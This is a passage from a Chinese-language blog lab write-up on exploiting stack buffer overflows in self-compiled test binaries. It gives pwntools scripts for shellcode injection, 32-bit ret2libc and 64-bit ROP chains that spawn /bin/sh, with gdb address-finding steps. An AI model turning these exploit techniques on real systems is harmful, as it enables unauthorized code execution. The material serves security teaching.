<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./rop1&#39;</span>)
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
</span></span><span style="display:flex;"><span>shellcode_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> shellcode<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x8c</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)<span style="color:#f92672">+</span>p32(shellcode_addr)
</span></span><span style="display:flex;"><span>print(payload)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;deadbeef&#34;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013221050582.png" alt="image-20211013221050582"  />
</li>
</ul>
</li>
<li>
<p>可以看到我们精心构造的shellcode已经存储到文件<code>deadbeef</code>里面</p>
</li>
</ul>
</li>
<li>
<p>在gdb 中调试</p>
<ul>
<li>命令<code>r &lt; deadbeef</code>，执行过程中通过管道输入我们构造好的shellcode</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013221413720.png" alt="image-20211013221413720"  />
</li>
<li>发现寄存器ECX存储的是shellcode存储的首地址
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013221504074.png" alt="image-20211013221504074"  />
</li>
</ul>
</li>
<li>此地址<code>0xffffd170</code>即为我们gdb调试过程中可以利用的buf真实地址</li>
</ul>
</li>
<li>
<p>下面利用上面同样的方法，构造好我们需要的产生shellcode的文件</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./rop1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
</span></span><span style="display:flex;"><span>shellcode_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffd170</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> shellcode<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x8c</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)<span style="color:#f92672">+</span>p32(shellcode_addr)
</span></span><span style="display:flex;"><span>print(payload)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;gdb_with_payload&#34;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013221809863.png" alt="image-20211013221809863"  />
</p>
</li>
<li>
<p>我们可以利用的shellcode文件即已经构造完成。</p>
</li>
</ul>
</li>
<li>
<p>下面在gdb中执行我们的shellcode</p>
<ul>
<li>
<p>这里需要做一些前置工作，因为我们想要设置一些软断点。否则输入shellcode后进程会被直接杀死，程序只会一闪而过。</p>
</li>
<li>
<p>这个软断点的意思是，跟踪我们输入的文件，文件输入完毕后，设置断点</p>
</li>
<li>
<p>命令如下</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>set detach-on-fork on
</span></span><span style="display:flex;"><span>set follow-fork-mode child
</span></span><span style="display:flex;"><span>set breakpoint pending on
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>b_start
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>首先告诉 gdb 跟踪子进程；然后设置<code>set breakpoint pending on</code>是为了在设置断点时让 gdb 不强制在对符号下断点时就需要固定地址，这样在<code>b _start</code>时就会 pending 而不是报错；最后再连接到父进程以及加载子进程的符号。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>直接<code>gdb rop1</code>进入命令，然后输入上述设置子进程的命令</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013222608753.png" alt="image-20211013222608753"  />
</li>
<li>然后输入命令<code>r &lt; gdb_with_payload</code>，执行的时候通过管道符载入数据<code>gdb_with_payload</code>，这里覆盖返回地址的是我们精心构造的适合gdb环境的buf地址(注意，这里的buf地址并不是程序直接运行产生的buf地址)</li>
<li>连续的<code>r</code>命令
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013223111380.png" alt="image-20211013223111380"  />
</li>
</ul>
</li>
<li>这里通过一个子进程的调度从而运行了我们的shellcode，很明显可以看到这里出现了我们的输入命令</li>
</ul>
</li>
<li>
<p>验证是否拿到shell</p>
<ul>
<li>输入命令<code>ls</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013223517585.png" alt="image-20211013223517585"  />
</li>
</ul>
</li>
<li>输入命令<code>whoami</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013223748201.png" alt="image-20211013223748201"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>这样我们就实现了通过gdb调试直接 控制shell，但是由于设置断点的子进程输入命令后，直接被附近到当前的命令，故每次调试只能使用一次。</p>
</li>
</ul>
<h3 id="rop1_py">rop1_py<a hidden class="anchor" aria-hidden="true" href="#rop1_py">#</a></h3>
<ul>
<li>
<p>这里是使用<strong>pwntools</strong>工具来实现拿到shell,pwntools实现的连接持久，这里同样也是我们上述提到的第三种方案<strong>利用内核转储获取真实地址</strong>(即利用 dump core 来实现获取buf地址，这个buf地址是受python环境影响的)</p>
</li>
<li>
<p>首先构造虚假的地址<code>0xdeadbeef</code>来使程序崩溃产生core</p>
<ul>
<li>
<p>脚本如下</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./rop1&#39;</span>)
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
</span></span><span style="display:flex;"><span>shellcode_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> shellcode<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x8c</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)<span style="color:#f92672">+</span>p32(shellcode_addr)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()      
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>在终端执行该脚本</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013224458697.png" alt="image-20211013224458697"  />
</li>
<li>通过前后<code>ls</code>命令可以很清晰的看到，执行脚本之后程序崩溃，产生了core报错文件</li>
</ul>
</li>
</ul>
</li>
<li>
<p>执行命令<code>gdb ./rop1 core</code>来调试该core</p>
<ul>
<li>此时esp指针位于返回地址的下一个位置，因此buf的地址是esp-0x4-0x8c，即地址<code>esp-0x90</code></li>
<li>通过命令<code>x/s $esp-0x90</code>查看
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013224830007.png" alt="image-20211013224830007"  />
</li>
</ul>
</li>
<li>发现地址<code>0xffffd1c0</code>存储的果然是shellcode存放的地方</li>
</ul>
</li>
<li>
<p>于是直接将返回地址修改为<code>0xffffd1c0</code></p>
</li>
<li>
<p>在终端执行exp</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013225047516.png" alt="image-20211013225047516"  />
</li>
<li>可以看到，我们已经拿到了shell</li>
</ul>
</li>
<li>
<p>最终exp 如下</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./rop1&#39;</span>)
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
</span></span><span style="display:flex;"><span>shellcode_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> shellcode<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x8c</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)<span style="color:#f92672">+</span>p32(shellcode_addr)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()      
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h3 id="rop2_32">rop2_32<a hidden class="anchor" aria-hidden="true" href="#rop2_32">#</a></h3>
<ul>
<li>
<p>编译rop1.c，只开启Canary栈保护，在32位环境下，编译生成rop2</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013011641045.png" alt="image-20211013011641045"  />
</p>
</li>
<li>
<p>可以看到NX保护已经开启，程序为32位程序</p>
</li>
<li>
<p>查看rop2进程栈的权限为rw-p，不可执行</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013012254744.png" alt="image-20211013012254744"  />
</p>
</li>
<li>
<p>栈上的程序不能运行，即我们不能在栈上执行shellcode，但在程序中用到了libc库中的read和printf函数，libc.so中保存了大量的可用函数，考虑调用system(&quot;/bin/sh&quot;)来绕过NX保护获取shell</p>
</li>
<li>
<p>根据ROP的原理，不难发现，我们可以将返回地址覆盖为我们要调用的<code>system</code>函数地址，然后在它下面写入<code>system</code>函数需要返回的地址以及它传入的参数<code>/bin/sh</code></p>
<ul>
<li>示意图如下
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013225744131.png" alt="image-20211013225744131"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>这里首先确定一下buf首地址到返回地址中间的差距，以便确定填充多少字符来覆盖返回地址。</p>
<ul>
<li>同样用IDA 查看 rop2 中 buf的结构</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013230348130.png" alt="image-20211013230348130"  />
</li>
<li>发现需要填充的字符为<code>0x88 + 0x04</code> 为 <code>0x8c</code></li>
</ul>
</li>
<li>
<p>因为我们环境已经关闭了地址随机化，因此<code>system</code>和<code>/bin/sh</code>的地址并不会随程序运行而改变。</p>
</li>
<li>
<p>接下来寻找system的地址</p>
<ul>
<li>我们可以在gdb 调试过程中 直接 调用命令<code>print system</code> 来查看system函数地址</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013230641575.png" alt="image-20211013230641575"  />
</li>
<li>因此<code>system</code>函数地址为<code>0xf7e17830</code></li>
</ul>
</li>
<li>
<p>接下来需要我们需要的字符串<code>/bin/sh</code>的存储地址</p>
<ul>
<li>这里我们需要调试gdb过程中，用到<code>vmmap</code> 命令来查看libc.so的起始位置，在其中间查找到存储<code>/bin/sh</code>的地址</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013232018196.png" alt="image-20211013232018196"  />
</li>
<li>根据起始地址和结束地址，查找<code>/bin/sh</code>的位置
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013232228719.png" alt="image-20211013232228719"  />
</li>
<li>显然<code>/bin/sh</code>存放的地址为<code>0xf7f64352</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>我们调用system后的返回地址因为我们不需要返回，所以直接填充<code>0xdeadbeef</code>即可</p>
</li>
<li>
<p>在终端下调用exp</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013232413269.png" alt="image-20211013232413269"  />
</li>
<li>很明显可以看到我们已经拿到了shell</li>
</ul>
</li>
<li>
<p>最终exp:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./rop2&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(p,&#39;b vuln&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sys_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0xf7e17830</span>
</span></span><span style="display:flex;"><span>binsh_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0xf7f64352</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8c</span> <span style="color:#f92672">+</span> p32(sys_addr)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0xdeadbeef</span>)<span style="color:#f92672">+</span>p32(binsh_addr)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h3 id="rop3_64">rop3_64<a hidden class="anchor" aria-hidden="true" href="#rop3_64">#</a></h3>
<ul>
<li>
<p>编译rop1.c，只开启Canary栈保护，关闭no-pie在64位环境下，编译生成rop3</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211014002450716.png" alt="image-20211014002450716"  />
</li>
<li>这里同样关闭了NX保护,同时编译产生的程序为64位</li>
</ul>
</li>
<li>
<p>并不能在栈上直接写shellcode，考虑同样构造ROP链的形式来拿到shell，但是64位程序不同于32位程序，参数存放在寄存器中，多于6个参数才会放在栈上。</p>
<ul>
<li>
<p>图例</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013232940489.png" alt="image-20211013232940489"  />
</p>
</li>
</ul>
</li>
<li>
<p>关于漏洞利用</p>
<ul>
<li>由于参数不会直接放在栈上，需要寻找类似于<code>pop rdi；ret</code>的gadget，将参数从栈中弹出到rdi寄存器后，返回到返回地址处继续执行。本例子在栈中事先压入参数<code>/bin/sh</code>地址和<code>system</code>地址。</li>
<li>图例即为
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013233227906.png" alt="image-20211013233227906"  />
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="ubuntu20-字节对齐">ubuntu20 字节对齐<a hidden class="anchor" aria-hidden="true" href="#ubuntu20-字节对齐">#</a></h4>
<ul>
<li>
<p>首先查看一下要从buf数组到返回地址 我们需要覆盖多少字节</p>
<ul>
<li>这里同样使用IDA来查看程序</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013233416642.png" alt="image-20211013233416642"  />
</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013233433233.png" alt="image-20211013233433233"  />
</li>
<li>发现buf数组长度为<code>0x80</code>，返回地址长度为<code>0x08</code>，故我们需要覆盖的长度为<code>0x88</code></li>
</ul>
</li>
<li>
<p>找到存在<code>pop rdi;ret</code>的指令地址</p>
<ul>
<li>这里使用<code>ROPgadget </code>工具
<ul>
<li>首先使用命令<code>ldd rop3</code>查看<code>rop3</code>使用的libc的版本，找到对应的版本，然后就在libc库中查到我们需要的<code>pop rdi;ret</code></li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013234221298.png" alt="image-20211013234221298"  />
</li>
<li>这里我们就拿到了<code>pop|rdi</code> 相对于libc的偏移地址<code>0x0000000000026b72</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>找到<code>system</code>和<code>/bin/sh</code>的地址</p>
<ul>
<li>
<p>这里的方法和找rop2中的方法一样</p>
</li>
<li>
<p>在gdb调试过程中，分别用<code>print system</code> 和<code>vmmap</code> 查找地址</p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013234446009.png" alt="image-20211013234446009"  />
</p>
<p>可以看到<code>system</code>的存储地址为<code>0x7ffff7e22410</code></p>
</li>
<li>
<p><code>vmmap </code>和<code>find</code>命令查找<code>/bin/sh</code>地址</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013234737469.png" alt="image-20211013234737469"  />
</p>
</li>
<li>
<p>可以看到<code>/bin/sh</code>的地址为<code>0x7ffff7f845aa</code></p>
</li>
<li>
<p><code>/usr/lib/x86_64-linux-gnu/libc-2.31.so</code>的起始地址为<code>0x7ffff7dcd000</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>按道理这个时候我们已经将地址一一对应填入即可拿到shellcode，但是由于我们机器使用的为ubuntu 20,在ubuntu18版本以上的系统，64位的程序若包含了system（“/bin/sh”），就需要考虑堆栈平衡。因为在Ubuntu18下system调用时要求地址和16字节对齐，如果没有栈对齐的话，程序就直接crash了。</p>
</li>
<li>
<p>我们这里填充的字符长度为<code>0x88</code>，因此我们需要在加入<code>0x08</code>个字符来平衡栈，这种情况下如加入新的字节不能影响我们ROP链的执行，因此我们该字符存储因改为<code>ret</code>指令类似的不影响逻辑的指令。</p>
</li>
<li>
<p>我们同样根据<code>ROPgadget</code>来拿到对应的<code>ret</code>存放的地址</p>
<ul>
<li>
<p>我们直接查看位于libc.so中的程序中一个存储<code>ret</code>指令的地址</p>
<ul>
<li>
<p>命令   <code>ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;ret&quot;</code></p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211014002557628.png" alt="image-20211014002557628"  />
</p>
</li>
<li>
<p>因为这里相对偏移基于<code>libc.so</code>的首地址为<code>0x0000000000025679</code></p>
</li>
<li>
<p>所以<code>ret</code>的实际地址为<code>0x7ffff7dcd000+0x0000000000025679</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>将填充好的地址 写入exp中，在终端执行exp</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211014002735998.png" alt="image-20211014002735998"  />
</li>
</ul>
</li>
<li>
<p>最终exp</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
